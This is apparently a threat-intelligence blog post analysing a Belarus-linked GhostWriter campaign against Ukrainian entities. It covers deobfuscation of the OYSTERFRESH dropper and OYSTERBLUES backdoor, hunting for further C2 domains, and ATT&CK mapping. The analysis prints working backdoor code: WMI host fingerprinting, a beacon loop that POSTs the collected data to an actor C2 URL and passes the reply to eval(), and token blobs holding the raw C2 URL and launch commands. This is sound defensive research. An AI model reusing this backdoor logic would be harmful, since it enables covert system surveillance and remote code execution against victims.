+++
title = "UAC-0057 / GhostWriter / UNC1151: JavaScript backdoor campaign analysis"
date = 2026-07-19
draft = false
tags = ["threat-intel", "APT", "Belarus", "malware-analysis"]
summary = "Technical analysis of a recent UNC1151 (GhostWriter) campaign targeting Ukrainian entities. Covers deobfuscation of the OYSTERFRESH dropper and OYSTERBLUES backdoor, CTI infrastructure hunting, and a MITRE ATT&CK technique mapping."
+++

## AI Disclaimer
**Malware analysis was performed entirely by a human**. The following **report was written by an AI** based on the notes taken during the analysis, and reviewed by the author.

## Overview
This report analyzes a campaign attributed to **UNC1151** (also tracked as **GhostWriter** / **UAC-0057**), a Belarussian state-sponsored threat actor linked to the KGB RB and assessed by CrowdStrike as [**UMBRAL BISON**](https://www.crowdstrike.com/en-us/adversaries/umbral-bison/). The group operates in support of Russian strategic objectives, primarily targeting Ukrainian government and civil-society entities.

The initial reporting comes from two CERT publications:
- **CERT-UA** — [https://cert.gov.ua/article/6315762](https://cert.gov.ua/article/6315762)
- **CERT PL** — [https://cert.pl/posts/2026/06/UNC1151-kampania-gmail/](https://cert.pl/posts/2026/06/UNC1151-kampania-gmail/)

The campaign delivers a multi-stage JavaScript implant chain via spearphishing emails sent from compromised accounts. The key components are:
- **OYSTERFRESH** — first-stage dropper / decoy document displayer
- **OYSTERBLUES** — second-stage backdoor (fingerprinter + eval-based executor)
- **OYSTERSHUCK** — decoder stub for OYSTERBLUES

The analysis covers full deobfuscation of both stages, identification of C2 infrastructure, and CTI pivoting to uncover additional campaign infrastructure.

## 1. Attribution & Background
UNC1151 is assessed to be the cyber arm of Belarussian intelligence (KGB RB). The group is well-documented for conducting influence and espionage operations in support of Russia's war against Ukraine, typically targeting Ukrainian government officials, military personnel, and civil-society organizations. This was the first campaign from this actor that I analyzed in depth.

## 2. Attack Flow
The following infection chain is described in CERT-UA's original publication:
1. A **compromised email account** (e.g., `certificates@prometheus.com.ua`) sends a spearphishing email with a decoy PDF attached.
2. The PDF contains a **download link** pointing to a ZIP archive hosted on an actor-controlled C2 server (`.icu` TLD).
3. The ZIP contains a **JavaScript file** (OYSTERFRESH). Execution is triggered on double-click.
4. OYSTERFRESH **displays an unblurred decoy document** to the victim while silently executing OYSTERBLUES in the background.
5. **OYSTERBLUES** fingerprints the compromised asset and beacons to the C2 server. The server returns a JavaScript payload that is executed via `eval()`. The confirmed intended next stage was a **Cobalt Strike beacon**.
6. **OYSTERSHUCK** is a separate decoder stub used to unwrap OYSTERBLUES prior to execution.

## 3. Analysis

### 3.1 OYSTERFRESH — First-stage dropper

**SHA-256:** `65752ab1d78b215e70a543b790a1946b9e316474fce114bd2089f35030801988` (`certificate.zip`)

The archive contains a single `.js` file serving as the initial payload. Deobfuscation required two passes:

1. **Pass 1 — Code beautification** via [beautifier.io](https://beautifier.io), yielding readable but still-encoded code.
2. **Pass 2 — LZString decompression:** the main data blob is LZString-encoded and stores `|`-delimited string tokens used to reconstruct all runtime identifiers at runtime. A representative snippet of those tokens:
```
[snipped data]|Script|FullNa|lastIn|dexOf|substr|ing|.pdf|ADODB.|Stream|Type|Open|Write|nodeTy|pedVal|SaveTo|File|t.Shel|Run|MSXML2|.XMLHT|TP.3.0|open|GET|setReq|uestHe|ader|User-A|gent|Mozilla/5.0 (Windows NT 10.0|; Win64; x64) AppleWebKit/53|7.36 (KHTML, like Gecko) Chr|ome/141.0.0.0 Safari/537.30|send|respon|seText|HKEY_CURRENT_U|SER\SOFTWARE\M|icrosoft\Windo|ws\Blue\Oyster|Object|Expand|Enviro|nmentS|trings|%Local|AppDat|\Google\Chrome\User|Data\Profile\Extens|ions\ghbmnnjooekpmo|ecnnnilnnbdlolhkhi\|1.117.9_7\_metadata|\computed\hashes|ing.Fi|leSyst|emObje|RegWri|REG_SZ|\orche|strato|r.js|\synch|ronize|\manip|ulator|.js|\ampli|fier.j|\trans|former|\accel|erator|\compo|sitor.|\regen|\inter|preter|\conso|lidato|\distr|ibutor|\encap|sulato|new:F935DC|22-1CF0-11|D0-ADB9-00|C04FD58A0B|rundll32.|exe shell|32.dll,Sh|ellExec_R|unDLL wsc|ript /B "|Delete
```

Notable token categories found in the blob:
- **Base64-encoded decoy PDF** — displayed to the victim immediately on execution to avoid suspicion.
- **Encoded OYSTERBLUES payload** — along with the registry key (`HKCU\SOFTWARE\Microsoft\Windows\Blue\Oyster`) and value name used to persist it.
- **C2 URL** — from which OYSTERBLUES is fetched and subsequently executed.
- **Runtime strings** — shell command fragments, User-Agent value, COM class GUIDs — split across tokens to defeat naive static string searches.

The decoy document displayed to the victim:
![](7167fd05-f9c5-4d7e-a1df-ac7f0f7ba8d1.png)
Translated:
![](7877841a-fb1a-47df-8141-7cdd5380b165.png)

The fully deobfuscated OYSTERFRESH snippet (all string tokens resolved):
![](7895e83a-c70b-4931-bd9e-640d697b1abb.png)

### 3.2 OYSTERBLUES — Second-stage backdoor

OYSTERBLUES is delivered by OYSTERFRESH and decoded by OYSTERSHUCK using the following three sequential transformations (confirmed by CERT-UA and reproducible in CyberChef):
1. String reversal
2. ROT13
3. URL decoding

![](8d7a87a0-b240-47f4-92ee-d886344f6326.png)

Structurally, OYSTERBLUES mirrors OYSTERFRESH:
- The LZString library is hardcoded into the script.
- A UTF-16 blob is decompressed at runtime and executed.
- All sensitive identifiers (`EncodeURIComponent`, `WScript`, `ActiveXObject`, etc.) are dynamically resolved from the token table.

The LZString-compressed token blob for OYSTERBLUES:
```
return| this|push|__prot|o__|constr|uctor|name|length|undefi|ned|ZQ01us|lmSTwW|deWZ3I|Pf6qef|P8Qn77|DhPWAj|AquB0R|Date|XaHELM|rLM66v|6dy5uN|ZWrZpA|Zr3QR2|s3QxZ9|2LQhIq|r6UsJ9|ONX5VK|TPjDkX|d4ybTq|GmbhPe|BgWJHW|Z5Xtzk|AstvxP|String|zENtrF|l6gGJK|X67Hu3|Wt6Prc|W2MxsI|_l3JBm|WpwhS8|NU2KHa|KNEMrW|XKUWFw|duujxT|qeg95x|xWS9gp|Z6gsIj|pSdVef|YZ8siT|NVcJWv|decode|URICom|ponent|5vThBf|eCGsPS|jNTHMJ|sT19nn|ILj9lC|qfvWm_|EOctNr|QlmHsk|axGP1C|Enumer|ator|bYQfvB|WScrip|eGJeMc|Pu9kAg|vA1DxI|AOLdTt|zO_sjQ|encode|mRhkb3|GetObj|ect|XgK3J3|Active|XObjec|wv4i4P|Pdlrvn|0YZcZB|pBcX25|bCK3B0|wcrjTi|6u5vtY|w4sMcw|LepwAL|aPCXeP|Se1nuF|RZdWaz|o3ttST|Ejr314|lfGvOK|W6VwKg|wqDenB|hxa5cS|mjWIIT|TSIc8z|QWAmMu|LxIP6j|winmgm|ts:\\.|\root\|cimv2|Create|Object|t.Netw|ork|UserNa|Comput|erName|ExecQu|ery|SELECT |* FROM |Win32_O|peratin|gSystem|atEnd|moveNe|item|Captio|Versio|SELECT * FRO|M Win32_Oper|atingSystem|LastBo|otUpTi|substr|ing|SELECT| * FRO|M Win3|2_Proc|ess|Proces|sId| > |Name|Comman|dLine|dmVDfE|join|G3qL1w|charCo|deAt|fromCh|arCode|
host |name: |
user |
syste|m type|
boot |time: |
local| time:|
proc |list:|MSXML2|.XMLHT|TP.3.0|open|POST|https://a3ufz.xsjdsb.icu/wp-json/|prometheus-plus/veteran-circle/sy|stem-team-management=https://apps|.prometheus.org.ua/authn/register|setReq|uestHe|ader|User-A|gent|Mozilla/5.0 (Window|s NT 10.0; Win64; x|64) AppleWebKit/537|.36 (KHTML, like Ge|cko) Chrome/141.0.0|.0 Safari/537.30|send|respon|seText|Sleep
```

Key token categories recoverable from the blob:
- **JavaScript internals** — `return`, `constructor`, `undefined`, `push`, etc.
- **Fingerprint field names** — `host name`, `user`, `system type`, `boot time`, `proc list`.
- **C2 URL, HTTP method, and User-Agent** — hardcoded for the beacon request.

#### 3.2.1 Beacon & C2 communication

Once fully deobfuscated (with all dynamically resolved function references manually resolved), the main loop of OYSTERBLUES looks as follows:
```js
function _0x51F855() {
    var _0x04A422 = get_system_type();
    var _0x0D8C162 = get_boot_time();
    var _0x7CE0C3 = get_proc_list();
    var payload = "";
    payload += "\nhost name: " + _0x22F4159;
    payload += "\nuser name: " + _0x3BC89F;
    payload += "\nsystem type: " + _0x04A422;
    payload += "\nboot time: " + _0x0D8C162;
    payload += "\nlocal time: " + new(Date);
    payload += "\nproc list:" + _0x7CE0C3;
    payload = EncodeURIComponent(_0xA2617A(EncodeURIComponent(payload)));
    var http_request = new(ActiveXObject)("MSXML2.XMLHTTP.3.0");
    http_request["open"]("POST", "https://a3ufz[.]xsjdsb[.]icu/wp-json/prometheus-plus/veteran-circle/system-team-management=https://apps[.]prometheus.org.ua/authn/register", false);
    http_request["setRequestHeader"]("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.30");
    http_request["send"](payload);
    var _0x51F855 = http_request["responseText"];
    try {
        eval(DecodeURIComponent(_0x51F855))
    } catch (_0x1ED306) {}
}
while (true) {
    try {
        _0x51F855()
    } catch (_0x44293B) {}
    WScript["Sleep"](600000)
}
```


The beacon loop runs indefinitely, sleeping 600 seconds (10 minutes) between iterations. The C2 response is URL-decoded and passed directly to `eval()`, meaning any JavaScript payload can be executed on demand — the confirmed intent was to deploy a Cobalt Strike beacon.

#### 3.2.2 System fingerprinting

Fingerprint data is collected via WMI queries through the `winmgmts:\\.\root\cimv2` namespace. The collected fields are:
```js
var winmgmts_cimv2 = GetObject("winmgmts:\\\\.\\root\\cimv2");
var WScript_Network = Wscript["CreateObject"]("WScript.Network");
var _0x3BC89F = WScript_Network["UserName"];
var _0x22F4159 = WScript_Network["ComputerName"];

function get_system_type() {
    var _0x04A422 = winmgmts_cimv2["ExecQuery"]("SELECT * FROM Win32_OperatingSystem");
    var _0x0D8C162 = new(_0x4761B0E("axGP1Ce"))(_0x04A422);
    var _0x7CE0C3 = "";
    for (; !_0x0D8C162["atEnd"](); _0x0D8C162["moveNext"]()) {
        _0x7CE0C3 = _0x0D8C162["item"]()["Caption"] + " " + _0x0D8C162["item"]()["Version"]
    }
    return _0x7CE0C3
}

function get_boot_time() {
    var _0x04A422 = winmgmts_cimv2["ExecQuery"]("SELECT * FROM Win32_OperatingSystem");
    var _0x0D8C162 = new(_0x4761B0E("axGP1Ce"))(_0x04A422);
    var _0x7CE0C3 = "";
    for (; !_0x0D8C162["atEnd"](); _0x0D8C162["moveNext"]()) {
        _0x7CE0C3 = _0x0D8C162["item"]()["LastBootUpTime"]
    }
    return new(Date)(_0x7CE0C3["substring"](0, 4), _0x7CE0C3["substring"](4, 6) - 1, _0x7CE0C3["substring"](6, 8), _0x7CE0C3["substring"](8, 10), _0x7CE0C3["substring"](10, 12), _0x7CE0C3["substring"](12, 14))
}

function get_proc_list() {
    var _0x0D8C162 = winmgmts_cimv2["ExecQuery"]("SELECT * FROM Win32_Process");
    var _0x7CE0C3 = new(_0x4761B0E("axGP1Ce"))(_0x0D8C162);
    var WScript_Network = [];
    for (; !_0x7CE0C3["atEnd"](); _0x7CE0C3["moveNext"]()) {
        WScript_Network["push"]("\n" + _0x7CE0C3["item"]()["ProcessId"] + " > " + _0x7CE0C3["item"]()["Name"] + " > " + _0x7CE0C3["item"]()["CommandLine"])
    }
    if (!("dmVDfEX" in _0x04A422)) {
        return WScript_Network["join"]("")
    } else {
        return "G3qL1w"
    }
}
```


The following data points are exfiltrated:
- **Hostname** and **username** (`WScript.Network.ComputerName` / `UserName`)
- **OS name and version** (`Win32_OperatingSystem.Caption` + `Version`)
- **Last boot time** (`Win32_OperatingSystem.LastBootUpTime`)
- **Local time** (`new Date()`)
- **Running process list** (`Win32_Process.ProcessId`, `Name`, `CommandLine`)

The complete payload is double-URL-encoded before being POST-ed to the C2. The attempt to interact live with the C2 server was not possible as it was already taken down at the time of analysis.

## 4. CTI Infrastructure Hunting

With the campaign's fingerprint established, it is worth pivoting to discover additional actor-controlled infrastructure beyond what CERT-UA already published. The tool used here is [URLScan](https://urlscan.io). The campaign's consistent delivery of a decoy PDF via `.icu` domains provides a reliable pivot: every known delivery URL hosts a certificate-themed PDF. The following URLScan query exploits this invariant:

```
page.domain:*.icu AND files.filename:*.pdf
```

Results:
![](9ebffe6a-2eff-45d5-8241-62e176cc7ac0.png)

The domain analyzed in this report (`a3ufz[.]xsjdsb[.]icu`) appears in the results, along with three domains already attributed by CERT-UA:
- `productionsamplesoftheyear[.]cgdirector[.]icu`
- `advancedaisolutionsforeveryone[.]a1si[.]icu`
- `easiestnewsfromourpointofview[.]algsat[.]icu`

Not all known campaign domains appeared — likely because they were never passively scanned on URLScan. However, the domain `mipan[.]icu` surfaced with a document that closely matched the campaign's decoy format:

![](431acb5d-15f5-4b7d-8de5-a7cd50e4e707.png)
Translated:
![](926c9692-9f0f-4169-bef8-3772bf298d61.png)

Pivoting on this domain in VirusTotal revealed a second known subdomain delivering a JavaScript backdoor — this time packaged in a RAR archive rather than a ZIP, suggesting minor delivery variation across sub-campaigns:
![](6da07c65-cc51-4037-969d-fc70a9c43df9.png)
![](82ab9695-6398-4ed9-8a24-19b838ed98b7.png)

## 5. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique | Observed Behavior |
|---|---|---|---|
| Resource Development | T1584.002 | Compromise Infrastructure | Compromised email account used as phishing sender |
| Resource Development | T1583.001 | Acquire Infrastructure: Domains | `.icu` TLD domains acquired for C2 and payload hosting |
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | Decoy PDF attached to phishing email containing download link |
| Execution | T1204.002 | User Execution: Malicious File | Victim double-clicks the `.js` file extracted from the ZIP |
| Execution | T1059.007 | Command and Scripting Interpreter: JavaScript | OYSTERFRESH and OYSTERBLUES are both JScript payloads executed by `wscript.exe` |
| Execution | T1059.003 | Command and Scripting Interpreter: Windows Command Shell | `rundll32.exe shell32.dll,ShellExec_RunDLL wscript /B` used to launch OYSTERBLUES |
| Execution | T1106 | Native API | COM objects (`ADODB.Stream`, `MSXML2.XMLHTTP.3.0`, `ActiveXObject`) invoked via WScript |
| Execution | T1059.007 | Dynamic Code Execution via eval() | C2 response passed directly to `eval(DecodeURIComponent(...))` for on-demand code execution |
| Persistence | T1112 | Modify Registry | OYSTERBLUES saved to `HKCU\SOFTWARE\Microsoft\Windows\Blue\Oyster` as a `REG_SZ` value |
| Defense Evasion | T1027 | Obfuscated Files or Information | Multi-layer obfuscation: LZString compression + `|`-split token table + ROT13 + string reversal + URL encoding |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Runtime token reconstruction; OYSTERSHUCK decodes OYSTERBLUES prior to execution |
| Defense Evasion | T1218.011 | System Binary Proxy Execution: Rundll32 | `rundll32.exe shell32.dll,ShellExec_RunDLL` used to launch the second-stage script |
| Discovery | T1082 | System Information Discovery | WMI `Win32_OperatingSystem` queried for OS name, version, and last boot time |
| Discovery | T1057 | Process Discovery | WMI `Win32_Process` queried for running process list (PID, name, command line) |
| Discovery | T1033 | System Owner/User Discovery | `WScript.Network.UserName` and `ComputerName` collected |
| Collection | T1119 | Automated Collection | Fingerprint assembled and transmitted automatically every 600 seconds |
| Command and Control | T1071.001 | Application Layer Protocol: Web Protocols | Beacon sent via HTTPS POST to C2 (`a3ufz[.]xsjdsb[.]icu`) |
| Command and Control | T1132.001 | Data Encoding: Standard Encoding | Payload double-URL-encoded before transmission |
| Command and Control | T1105 | Ingress Tool Transfer | C2 response carries next-stage JS payload (intended: Cobalt Strike stager) |

## 6. Conclusion

This campaign illustrates how UNC1151 leverages relatively simple but well-layered tooling to conduct espionage operations in support of Russia's strategic objectives. The implant chain — three sequential JavaScript components with multiple stacked obfuscation passes — is not technically sophisticated in isolation, but the combination of a convincing spearphishing lure, a compromised legitimate sender address, and a multi-stage execution chain is operationally effective against non-technical targets.

From a reverse-engineering standpoint, none of the individual obfuscation steps posed a significant challenge: LZString decompression, ROT13, and string reversal are all well-documented and trivially reversible. The actor's reliance on `eval()` for second-stage execution also makes dynamic analysis straightforward. What is more interesting is the infrastructure pivot: the campaign's consistent use of `.icu` domains hosting decoy PDFs provides a reusable hunting signature that revealed additional infrastructure beyond CERT-UA's original disclosures.